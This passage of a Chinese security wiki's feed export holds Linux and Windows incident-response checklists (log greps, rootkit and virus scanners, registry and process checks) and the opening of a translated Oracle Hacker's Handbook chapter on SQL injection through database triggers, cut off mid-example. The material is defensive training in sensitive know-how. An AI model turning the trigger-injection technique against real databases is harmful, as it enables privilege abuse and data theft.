&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： </span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; /var/log/secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line"># grep &quot;userdel&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure><h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="Rootkit查杀"><a href="#Rootkit查杀" class="headerlink" title="Rootkit查杀"></a>Rootkit查杀</h4><ul><li><p>chkrootkit  </p><p>网址：<a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense</span><br><span class="line">#编译完成没有报错的话执行检查</span><br><span class="line">./chkrootkit</span><br></pre></td></tr></table></figure></li><li><p>rkhunter</p><p>网址：<a href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz</span><br><span class="line">tar -zxvf rkhunter-1.4.4.tar.gz</span><br><span class="line">cd rkhunter-1.4.4</span><br><span class="line">./installer.sh --install</span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure></li></ul><h4 id="病毒查杀"><a href="#病毒查杀" class="headerlink" title="病毒查杀"></a>病毒查杀</h4><ul><li><p>Clamav</p><p>ClamAV的官方下载地址为：<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a> </p><p>安装方式一： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1、安装zlib：</span><br><span class="line">wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz </span><br><span class="line">tar -zxvf  zlib-1.2.7.tar.gz</span><br><span class="line">cd zlib-1.2.7</span><br><span class="line">#安装一下gcc编译环境： yum install gcc</span><br><span class="line">CFLAGS=&quot;-O3 -fPIC&quot; ./configure --prefix= /usr/local/zlib/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">2、添加用户组clamav和组成员clamav：</span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s /bin/false -c &quot;Clam AntiVirus&quot; clamav</span><br><span class="line"></span><br><span class="line">3、安装Clamav</span><br><span class="line">tar –zxvf clamav-0.97.6.tar.gz</span><br><span class="line">cd clamav-0.97.6</span><br><span class="line">./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">4、配置Clamav</span><br><span class="line">mkdir /opt/clamav/logs</span><br><span class="line">mkdir /opt/clamav/updata</span><br><span class="line">touch /opt/clamav/logs/freshclam.log</span><br><span class="line">touch /opt/clamav/logs/clamd.log</span><br><span class="line">cd /opt/clamav/logs</span><br><span class="line">chown clamav:clamav clamd.log</span><br><span class="line">chown clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line">5、ClamAV 使用：</span><br><span class="line"> /opt/clamav/bin/freshclam 升级病毒库</span><br><span class="line">./clamscan –h 查看相应的帮助信息</span><br><span class="line">./clamscan -r /home  扫描所有用户的主目录就使用</span><br><span class="line">./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果</span><br></pre></td></tr></table></figure><p>安装方式二： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#安装</span><br><span class="line">yum install -y clamav</span><br><span class="line">#更新病毒库</span><br><span class="line">freshclam</span><br><span class="line">#扫描方法</span><br><span class="line">clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log</span><br><span class="line">clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log</span><br><span class="line">clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log</span><br><span class="line">#扫描并杀毒</span><br><span class="line">clamscan -r  --remove  /usr/bin/bsd-port</span><br><span class="line">clamscan -r  --remove  /usr/bin/</span><br><span class="line">clamscan -r --remove  /usr/local/zabbix/sbin</span><br><span class="line">#查看日志发现</span><br><span class="line">cat /root/usrclamav.log |grep FOUND</span><br></pre></td></tr></table></figure></li></ul><h4 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h4><p>linux版：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">河马webshell查杀：http://www.shellpub.com</span><br><span class="line">深信服Webshell网站后门检测工具：http://edr.sangfor.com.cn/backdoor_detection.html</span><br></pre></td></tr></table></figure><h4 id="RPM-check检查"><a href="#RPM-check检查" class="headerlink" title="RPM check检查"></a>RPM check检查</h4><p>​    系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rpm -Va &gt; rpm.log</span><br></pre></td></tr></table></figure><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">验证内容中的8个信息的具体内容如下：</span><br><span class="line">S         文件大小是否改变</span><br><span class="line">M         文件的类型或文件的权限（rwx）是否被改变</span><br><span class="line">5         文件MD5校验是否改变（可以看成文件内容是否改变）</span><br><span class="line">D         设备中，从代码是否改变</span><br><span class="line">L         文件路径是否改变</span><br><span class="line">U         文件的属主（所有者）是否改变</span><br><span class="line">G         文件的属组是否改变</span><br><span class="line">T         文件的修改时间是否改变</span><br></pre></td></tr></table></figure><p>如果命令被替换了，如果还原回来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件提取还原案例：</span><br><span class="line">rpm  -qf /bin/ls  查询ls命令属于哪个软件包</span><br><span class="line">mv  /bin/ls /tmp  先把ls转移到tmp目录下，造成ls命令丢失的假象</span><br><span class="line">rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取rpm包中ls命令到当前目录的/bin/ls下</span><br><span class="line">cp /root/bin/ls  /bin/ 把ls命令复制到/bin/目录 修复文件丢失</span><br></pre></td></tr></table></figure><h4 id="linux安全检查脚本"><a href="#linux安全检查脚本" class="headerlink" title="linux安全检查脚本"></a>linux安全检查脚本</h4><p>Github项目地址：</p><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><p><a href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></p><p><a href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://github.com/Bypass007/Emergency-Response-Notes.git">https://github.com/Bypass007/Emergency-Response-Notes.git</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信</summary>
      
    
    
    
    <category term="3. 应急响应" scheme="http://example.com/categories/3-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="Linux应急响应" scheme="http://example.com/categories/3-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="Linux应急响应" scheme="http://example.com/tags/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>Windows应急响应</title>
    <link href="http://example.com/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <id>http://example.com/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</id>
    <published>2021-07-23T03:10:02.000Z</published>
    <updated>2021-07-23T03:42:08.756Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>常见的应急响应事件分类：</p><p>web入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS攻击、DNS劫持、ARP欺骗</p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些Window服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="检查系统账号安全"><a href="#检查系统账号安全" class="headerlink" title="检查系统账号安全"></a>检查系统账号安全</h4><p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</p><ul><li>检查方法：据实际情况咨询相关服务器管理员。</li></ul><p>2、查看服务器是否存在可疑账号、新增账号。</p><ul><li>检查方法：打开 cmd 窗口，输入<code>lusrmgr.msc</code>命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。 </li></ul><p><img src="/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1.png"></p><p>3、查看服务器是否存在隐藏账号、克隆账号。</p><ul><li><p>检查方法：</p><p>a、打开注册表 ，查看管理员对应键值。</p><p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。</p></li></ul><p><img src="/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/sum-1-1.png"></p><p>4、结合日志，查看管理员登录时间、用户名是否存在异常。</p><ul><li><p>检查方法：</p><p>a、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>b、导出Windows日志–安全，利用Log Parser进行分析。</p></li></ul><p><img src="/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/sum-1-2.png"></p><h4 id="检查异常端口、进程"><a href="#检查异常端口、进程" class="headerlink" title="检查异常端口、进程"></a>检查异常端口、进程</h4><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><ul><li><p>检查方法：</p><p>a、netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED </p><p>b、根据netstat 定位出的pid，再通过tasklist命令进行进程定位 tasklist  | findstr “PID”</p></li></ul><p><img src="/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/sum-1-3.png"></p><p>2、进程</p><ul><li><p>检查方法：</p><p>a、开始–运行–输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。</p><p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p><p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p><p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p><pre><code>    没有签名验证信息的进程    没有描述信息的进程    进程的属主    进程的路径是否合法    CPU或内存资源占用长时间过高的进程</code></pre></li></ul><p>3、小技巧：</p><p>​    a、查看端口对应的PID： netstat -ano | findstr “port”</p><p>​    b、查看进程对应的PID：任务管理器–查看–选择列–PID 或者  tasklist  | findstr “PID”</p><p>​    c、查看进程对应的程序位置：</p><p>​        任务管理器–选择对应进程–右键打开文件位置</p><p>​        运行输入 wmic，cmd界面 输入  process</p><p>​    d、tasklist /svc   进程–PID–服务</p><p>​    e、查看Windows服务所对应的端口：<br>​        %system%/system32/drivers/etc/services（一般%system%就是C:\Windows）</p><h4 id="检查启动项、计划任务、服务"><a href="#检查启动项、计划任务、服务" class="headerlink" title="检查启动项、计划任务、服务"></a>检查启动项、计划任务、服务</h4><p>1、检查服务器是否有异常的启动项。</p><ul><li><p>检查方法：</p><p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。<br>b、单击开始菜单 &gt;【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。<br>c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：<br>HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce<br>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p>d、利用安全软件查看启动项、开机时间管理等。</p><p>e、组策略，运行gpedit.msc。</p></li></ul><p><img src="/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/sum-1-4.png"></p><p>2、检查计划任务</p><ul><li><p>检查方法：</p><p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p><p>b、单击【开始】&gt;【运行】；输入 cmd，然后输入at，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p></li></ul><p>3、服务自启动</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入services.msc，注意服务状态和启动类型，检查是否有异常服务。</li></ul><h4 id="检查系统相关信息"><a href="#检查系统相关信息" class="headerlink" title="检查系统相关信息"></a>检查系统相关信息</h4><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入systeminfo，查看系统信息</li></ul><p>2、查找可疑目录及文件</p><ul><li><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><p>​    Window 2003  C:\Documents and Settings</p><p>​    Window 2008R2  C:\Users\</p><p>b、单击【开始】&gt;【运行】，输入%UserProfile%\Recent，分析最近打开分析可疑文件。</p><p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d、回收站、浏览器下载目录、浏览器历史记录</p><p>e、修改时间在创建时间之前的为可疑文件</p></li></ul><p>3、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>​    a、利用 Registry Workshop  注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。</p><p>​    b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p><h4 id="自动化查杀"><a href="#自动化查杀" class="headerlink" title="自动化查杀"></a>自动化查杀</h4><ul><li><p>病毒查杀</p><ul><li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li></ul></li><li><p>webshell查杀</p><ul><li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款webshell查杀工具同时查杀，可相互补充规则库的不足。</li></ul></li></ul><h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>系统日志</p><ul><li><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>b、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>C、导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。</p></li></ul><p>WEB访问日志</p><ul><li><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p><p>​                 Linux下，使用Shell命令组合查询分析</p></li></ul><h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h4><p>PCHunter：<a href="http://www.xuetr.com/">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p><h4 id="病毒查杀"><a href="#病毒查杀" class="headerlink" title="病毒查杀"></a>病毒查杀</h4><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a>   （推荐理由：绿色版、最新病毒库）</p><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free%EF%BC%88%E6%8E%A8%E8%8D%90%E7%90%86%E7%94%B1%EF%BC%9A%E6%89%AB%E6%8F%8F%E5%BF%AB%E3%80%81%E4%B8%80%E6%AC%A1%E4%B8%8B%E8%BD%BD%E5%8F%AA%E8%83%BD%E7%94%A81%E5%91%A8%EF%BC%8C%E6%9B%B4%E6%96%B0%E7%97%85%E6%AF%92%E5%BA%93%EF%BC%89">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p><p>火绒安全软件：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>360杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p><h4 id="病毒动态"><a href="#病毒动态" class="headerlink" title="病毒动态"></a>病毒动态</h4><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn/">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net/">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h4 id="在线病毒扫描网站"><a href="#在线病毒扫描网站" class="headerlink" title="在线病毒扫描网站"></a>在线病毒扫描网站</h4><p><a href="http://www.virscan.org/">http://www.virscan.org</a>         //多引擎在线病毒扫描网 v1.02，当前支持 41 款杀毒引擎     </p><p><a href="https://habo.qq.com/">https://habo.qq.com</a>             //腾讯哈勃分析系统</p><p><a href="https://virusscan.jotti.org/">https://virusscan.jotti.org</a>      //Jotti恶意软件扫描系统</p><p><a href="http://www.scanvir.com/">http://www.scanvir.com</a>        //针对计算机病毒、手机病毒、可疑文件等进行检测分析</p><h4 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h4><p>D盾_Web查杀：<a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p><p>河马webshell查杀：<a href="http://www.shellpub.com/">http://www.shellpub.com</a></p><p>深信服Webshell网站后门检测工具：<a href="http://edr.sangfor.com.cn/backdoor_detection.html">http://edr.sangfor.com.cn/backdoor_detection.html</a></p><p>Safe3：<a href="http://www.uusec.com/webshell.zip">http://www.uusec.com/webshell.zip</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://github.com/Bypass007/Emergency-Response-Notes.git">https://github.com/Bypass007/Emergency-Response-Notes.git</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信</summary>
      
    
    
    
    <category term="3. 应急响应" scheme="http://example.com/categories/3-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="Windows应急响应" scheme="http://example.com/categories/3-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="Windows应急响应" scheme="http://example.com/tags/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>The Oracle Hacker&#39;s Handbook: Hacking and Defending Oracle 下篇</title>
    <link href="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/"/>
    <id>http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/</id>
    <published>2021-07-14T08:07:07.000Z</published>
    <updated>2021-07-14T08:19:35.537Z</updated>
    
    <content type="html"><![CDATA[<p><strong>The  Oracle Hacker’s Handbook: Hacking and Defending Oracle</strong> </p><p><strong>by David  Litchfield John Wiley &amp; Sons</strong></p><h2 id="触发器（Triggers-）"><a href="#触发器（Triggers-）" class="headerlink" title="触发器（Triggers ）"></a>触发器（Triggers ）</h2><p>在 Oracle 中，触发器是执行某些任务并在给定事件发生时自动触发的 PL/SQL 代码片段。可以为各种事件创建触发器，包括 DML 操作，如 INSERT、DELETE 和 UPDATE；并且它们可以设置为在事件之前或之后触发。触发器也可以定义为事件，例如用户登录、用户被删除或表被截断——换句话说，为所有类型的事件。当涉及到触发器时，有几个关键点需要记住。</p><p>首先，触发器以定义它的用户的权限执行。其次，就本章而言，可能更重要的是，就像任何 PL/SQL 对象一样，触发器可能容易受到攻击。在查看实际示例之前，查看一个人为的 SQL 注入示例会很有启发性。对于此示例，我们创建了两个表：一个称为 MYTABLE 以保存短字符串，另一个称为 MYTABLE_LONG 以保存长度超过 15 个字符的字符串的副本。然后我们在 MYTABLE 上创建一个触发器以在插入之前触发，这样如果有人试图将长度超过 15 个字符的字符串插入到 MYTABLE 中，副本也会存储在 MYTABLE_LONG 中。这个例子除了证明这一点之外毫无用处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; CONNECT SCOTT/TIGER</span><br><span class="line">Connected.</span><br><span class="line">SQL&gt; SET SERVEROUTPUT ON</span><br><span class="line">SQL&gt; CREATE TABLE MYTABLE (V VARCHAR2(200));</span><br><span class="line"></span><br><span class="line">Table created.</span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE TABLE MYTABLE_LONG (V VARCHAR2(200));</span><br><span class="line"></span><br><span class="line">Table created.</span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE OR REPLACE 